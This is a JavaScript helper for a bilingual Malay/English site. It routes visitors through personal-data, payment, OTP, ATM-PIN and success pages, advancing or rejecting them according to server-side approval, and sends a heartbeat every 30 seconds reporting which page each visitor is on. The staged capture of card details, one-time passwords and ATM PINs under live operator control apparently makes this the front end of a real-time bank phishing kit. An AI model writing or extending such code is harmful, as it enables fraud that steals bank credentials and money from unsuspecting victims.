// Unified Navigation and Localization Helper

let currentLang = sessionStorage.getItem('lang') || 'ms';
const getLang = () => currentLang;

const getLocalizedPage = (basePage) => {
    const lang = getLang();
    if (lang === 'en') {
        if (basePage === 'index') return 'index-en.html';
        if (basePage === 'data') return 'data-en.html';
        if (basePage === 'payment') return 'payment-en.html';
        if (basePage === 'otp') return 'otp-en.html';
        if (basePage === 'atm-pin') return 'atm-pin-en.html';
        if (basePage === 'success') return 'success-en.html';
        if (basePage === 'loading') return 'loading_en.html';
        return `${basePage}-en.html`;
    }
    return `${basePage}.html`;
};

const navigateTo = (basePage) => {
    window.location.href = getLocalizedPage(basePage);
};

const pollStatus = async (orderId, currentStage) => {
    try {
        const res = await fetch(`/api/orders/${orderId}/status`);
        const data = await res.json();

        if (data.lang) {
            currentLang = data.lang;
            sessionStorage.setItem('lang', data.lang);
        }

        if (data.status === 'approved') {
            const stageToPage = {
                'personal_data': 'payment',
                'loading_otp': 'otp',
                'otp': 'otp',
                'loading_atm': 'atm-pin',
                'atm_pin': 'atm-pin',
                'loading_success': 'success',
                'success': 'success'
            };
            const nextPage = stageToPage[data.currentPage];
            if (nextPage) navigateTo(nextPage);
            return true;
        } else if (data.status === 'rejected') {
            const errorModal = document.getElementById('errorModal');
            const errorMessage = document.getElementById('errorMessage');
            if (errorModal && errorMessage) {
                let msg = data.message;
                // If the message is the default bilingual one, localize it
                if (msg === 'Information is incorrect / Maklumat tidak betul' || msg === 'Information incorrect') {
                    msg = getLang() === 'en' ? 'Information is incorrect' : 'Maklumat tidak betul';
                }
                errorMessage.textContent = msg || (getLang() === 'en' ? 'Verification failed' : 'Pengesahan gagal');
                errorModal.style.display = 'flex';
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
            }
            return true;
        }
    } catch (err) {
        console.error('Polling error:', err);
    }
    return false;
};

// Global Heartbeat
const sendHeartbeat = () => {
    fetch('/api/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentPage: window.location.pathname })
    }).catch(() => {});
};
setInterval(sendHeartbeat, 30000);
sendHeartbeat();
